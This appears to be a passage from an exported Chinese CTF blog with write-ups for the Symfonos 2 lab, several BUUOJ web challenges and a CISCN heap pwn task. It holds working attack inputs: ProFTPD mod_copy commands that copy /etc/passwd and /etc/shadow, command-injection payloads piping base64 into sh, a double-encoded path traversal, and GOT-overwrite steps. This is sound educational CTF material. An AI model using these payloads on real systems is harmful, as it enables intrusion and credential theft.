default</span></span><br><span class="line">&lt;Limit SITE_CHMOD&gt;</span><br><span class="line">  DenyAll</span><br><span class="line">&lt;/Limit&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> A basic anonymous configuration, no upload directories.  If you <span class="keyword">do</span> not</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span></span><br><span class="line">&lt;Anonymous ~ftp&gt;</span><br><span class="line">  User				ftp</span><br><span class="line">  Group				ftp</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> We want clients to be able to login with <span class="string">&quot;anonymous&quot;</span> as well as <span class="string">&quot;ftp&quot;</span></span></span><br><span class="line">  UserAlias			anonymous ftp</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Limit the maximum number of anonymous logins</span></span><br><span class="line">  MaxClients			10</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> We want <span class="string">&#x27;welcome.msg&#x27;</span> displayed at login, and <span class="string">&#x27;.message&#x27;</span> displayed</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">in</span> each newly chdired directory.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">DisplayLogin			welcome.msg</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">DisplayChdir			.message</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Limit WRITE everywhere <span class="keyword">in</span> the anonymous chroot</span></span><br><span class="line">  &lt;Limit WRITE&gt;</span><br><span class="line">    DenyAll</span><br><span class="line">  &lt;/Limit&gt;</span><br><span class="line">&lt;/Anonymous&gt;</span><br></pre></td></tr></table></figure>

<p>得到了共享文件的目录为<code>/home/aeolus/share</code>以及用户名<code>aeolus</code></p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>上面的结果可以看到<code>ftp</code>使用了<code>Proftpd 1.3.5</code></p>
<p>查找一下漏洞</p>
<img src="symfonos:2/image-20200808145305403.png" alt="image-20200808145305403" style="zoom:50%;" />



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Description TJ Saunders 2015-04-07 16:35:03 UTC</span><br><span class="line">Vadim Melihow reported a critical issue with proftpd installations that use the</span><br><span class="line">mod_copy module&#x27;s SITE CPFR/SITE CPTO commands; mod_copy allows these commands</span><br><span class="line">to be used by *unauthenticated clients*:</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line">Trying 80.150.216.115...</span><br><span class="line">Connected to 80.150.216.115.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]</span><br><span class="line">site help</span><br><span class="line">214-The following SITE commands are recognized (* =&gt;&#x27;s unimplemented)</span><br><span class="line">214-CPFR &lt;sp&gt; pathname</span><br><span class="line">214-CPTO &lt;sp&gt; pathname</span><br><span class="line">214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path</span><br><span class="line">214-SYMLINK &lt;sp&gt; source &lt;sp&gt; destination</span><br><span class="line">214-RMDIR &lt;sp&gt; path</span><br><span class="line">214-MKDIR &lt;sp&gt; path</span><br><span class="line">214-The following SITE extensions are recognized:</span><br><span class="line">214-RATIO -- show all ratios in effect</span><br><span class="line">214-QUOTA</span><br><span class="line">214-HELP</span><br><span class="line">214-CHGRP</span><br><span class="line">214-CHMOD</span><br><span class="line">214 Direct comments to root@www01a</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /tmp/passwd.copy</span><br><span class="line">250 Copy successful</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">He provides another, scarier example:</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto &lt;?php phpinfo(); ?&gt;</span><br><span class="line">550 cpto: Permission denied</span><br><span class="line">site cpfr /proc/self/fd/3</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /var/www/test.php</span><br><span class="line"></span><br><span class="line">test.php now contains</span><br><span class="line">----------------------</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): FTP session opened.</span><br><span class="line">2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error opening destination file &#x27;/&lt;?php</span><br><span class="line">phpinfo(); ?&gt;&#x27; for copying: Permission denied</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">test.php contains contain correct php script &quot;&lt;?php phpinfo(); ?&gt;&quot; which</span><br><span class="line">can be run by the php interpreter</span><br><span class="line"></span><br><span class="line">Source: http://bugs.proftpd.org/show_bug.cgi?id=4169</span><br></pre></td></tr></table></figure>

<p>拷贝任意文件</p>
<p>根据这个，拷贝<code>/etc/shadow</code>和<code>/etc/passwd</code>到<code>/home/aeolus/share/</code>目录下，并且通过smb可以下载到本地</p>
<p>对里面的hash值使用john破解，得到了一个密码</p>
<img src="symfonos:2/image-20200808145719194.png" alt="image-20200808145719194" style="zoom:50%;" />





<p>使用ssh连接上去</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>（翻参考答案）</p>
<p>里面安装了<code>nmap</code>软件，所以<code>nmap localhost</code></p>
<img src="symfonos:2/image-20200808145945366.png" alt="image-20200808145945366" style="zoom:50%;" />

<p>发现开启了<code>8080</code>端口</p>
<p>使用msf的ssh转发模块——<code>portfwd</code></p>
<img src="symfonos:2/image-20200808150333164.png" alt="image-20200808150333164" style="zoom:50%;" />

<img src="symfonos:2/image-20200808150502696.png" alt="image-20200808150502696" style="zoom:50%;" />



<p>访问<code>http://127.0.0.1:8848</code>即可</p>
<h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>访问之后发现是一个<code>librenms</code></p>
<img src="symfonos:2/image-20200808150554104.png" alt="image-20200808150554104" style="zoom:50%;" />

<p>查看一下exp</p>
<img src="symfonos:2/image-20200808150649713.png" alt="image-20200808150649713" style="zoom:50%;" />

<p>使用第一个exp</p>
<p>填上参数之后攻击成功</p>
<img src="symfonos:2/image-20200808150856911.png" alt="image-20200808150856911" style="zoom:50%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><img src="symfonos:2/image-20200808150953085.png" alt="image-20200808150953085" style="zoom:50%;" />

<p>可以以root权限使用<code>mysql</code></p>
<p>到<a href="https://gtfobins.github.io/">这个网站</a>查一下mysql的提权方法</p>
<img src="symfonos:2/image-20200808151108090.png" alt="image-20200808151108090" style="zoom:50%;" />

<p>运行后提权到了<code>root</code></p>
<img src="symfonos:2/image-20200808151152528.png" alt="image-20200808151152528" style="zoom:50%;" />



<img src="symfonos:2/image-20200808151240146.png" alt="image-20200808151240146" style="zoom:50%;" />



]]></content>
      <categories>
        <category>exploit</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>exploit</tag>
      </tags>
  </entry>
  <entry>
    <title>提升交互式shell</title>
    <url>//upgrade_shell.html</url>
    <content><![CDATA[<h1 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h1><p><a href="https://www.sohu.com/a/161766202_709042">https://www.sohu.com/a/161766202_709042</a></p>
]]></content>
      <categories>
        <category>exploit</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020</title>
    <url>//buu_ACTF2020.html</url>
    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
<a id="more"></a>

<h1 id="ACTF-2020-Exec"><a href="#ACTF-2020-Exec" class="headerlink" title="ACTF-2020-Exec"></a>ACTF-2020-Exec</h1><p>点进靶机界面如下</p>
<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />

<p>结合题目名，猜测是命令执行</p>
<p>输入<code>l | ls</code></p>
<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />

<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />

<p>使用<code>cat</code>命令读取</p>
<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />



<h1 id="ACTF-2020-Include"><a href="#ACTF-2020-Include" class="headerlink" title="ACTF-2020-Include"></a>ACTF-2020-Include</h1><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<p>结合题目名可以猜测是一个文件包含</p>
<p>使用<code>php伪协议</code>读一下源码</p>
<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p>解码之后是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>

<p>得到了flag</p>
]]></content>
      <categories>
        <category>web</category>
        <category>buu</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019_Ping Ping Ping</title>
    <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
<a id="more"></a>



<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><img src="[GXYCTF2019]Ping Ping Ping/image-20200809214947203.png" alt="image-20200809214947203" style="zoom:50%;" />

<p>给了一个参数是<code>ip</code>，猜测也是命令执行</p>
<p>使用<code>?ip=l;ls</code></p>
<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215038502.png" alt="image-20200809215038502" style="zoom:50%;" />

<p>尝试<code>cat flag.php</code></p>
<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215106353.png" alt="image-20200809215106353" style="zoom:50%;" />

<p>过滤了空格</p>
<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>查找资料用于绕过空格</p>
<p><a href="https://www.freebuf.com/articles/web/137923.html">CTF中绕过小技巧</a></p>
<p>经过测试发现<code>$IFS$9</code>可以绕过</p>
<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215218599.png" alt="image-20200809215218599" style="zoom:50%;" />

<p>继续读<code>flag.php</code></p>
<img src="[GXYCTF2019]Ping Ping Ping/image-20200809215246648.png" alt="image-20200809215246648" style="zoom:50%;" />

<p><code>flag</code>也被过滤了</p>
<p>看一下<code>index.php</code>的代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="绕过flag"><a href="#绕过flag" class="headerlink" title="绕过flag"></a>绕过flag</h2><p>这里屏蔽了很多语法，但是没有屏蔽<code>base64</code>和<code>sh</code></p>
<p>使用<code>base64 -d</code>可以达到相同的作用</p>
<p><code>payload</code>如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;l;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure>

<p>执行之后在注释里面看到<code>flag</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web</category>
        <category>buu</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF_2018_WarmUp</title>
    <url>//buu_HCTF2018_WarmUp.html</url>
    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
<a id="more"></a>



<h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><p>访问之后是一个滑稽的表情，查看网页源代码提示有一个<code>source.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--source.php--&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;br&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg&quot; &#x2F;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>





<h2 id="source-php"><a href="#source-php" class="headerlink" title="source.php"></a>source.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>要想达到文件包含</p>
<ul>
<li>变量<code>$file</code>不为空</li>
<li><code>$file</code>要是一个字符串</li>
<li>能够通过<code>emmm::checkfile</code></li>
</ul>
<h3 id="emmm-checkfile"><a href="#emmm-checkfile" class="headerlink" title="emmm:checkfile"></a>emmm:checkfile</h3><p>想要<code>return true</code>就要满足以下条件</p>
<ul>
<li><code>$file</code>不为空</li>
<li><code>$file</code>在两个<code>?</code>字符之间的部分需要在<code>whitelist</code>里面</li>
</ul>
<h2 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>告诉了<code>flag</code>存放的位置</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>对<code>?</code>字符进行两次<code>urlencode</code>就可以绕过<code>emmm:checkfile</code>。</p>
<p>在发送数据到服务器的时候会有一次<code>urldecode</code>，然后在<code>emmm:checkfile</code>中有第二次过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>访问上述url时，服务器将第一次<code>urldecode</code>，结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;6cba0961-d475-45e3-b0ea-9040e2e31cf5.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php%3f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>在执行<code>source.php</code>的过程中，第二次解码之后的数据为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>取到<code>?</code>即<code>source.php</code>通过白名单验证</p>
<p>至于上面的好多<code>../</code>是由于不知道<code>flag</code>文件的目录，所以只能穷举父级目录<code>../</code></p>
]]></content>
      <categories>
        <category>web</category>
        <category>buu</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn初赛-nofree</title>
    <url>//ciscn_nofree.html</url>
    <content><![CDATA[<p>2020年国赛 初赛pwn题</p>
<p>由于我是懒狗，现在才想起来写wp（</p>
<a id="more"></a>



<h1 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916171504771.png" alt="image-20200916171504771"></p>
<p>没有开<code>pie</code>和<code>pelro</code></p>
<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbufs();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = menu();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    edit(a1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4009EF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Management:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1- New &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2- Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> get_int();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正如描述的那样，没有<code>free</code>选项</p>
<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">    result = get_int();</span><br><span class="line">    v2 = result;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)result &lt;= <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>] = get_content(result);</span><br><span class="line">      result = v2;</span><br><span class="line">      *(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>] = v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会分配一个堆块，并且把<code>size</code>写进结构体</p>
<p>但是分配堆块的大小，不是由<code>size</code>决定，而是由<code>strlen(content)</code>决定</p>
<p>导致了溢出</p>
<p>并且在add的时候，没有检查堆块是否已经存在，导致无限申请</p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
<p>详情请见CTFwiki</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
<p>运行之后</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
<p><code>topbin</code>被修改为一个小的值</p>
<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
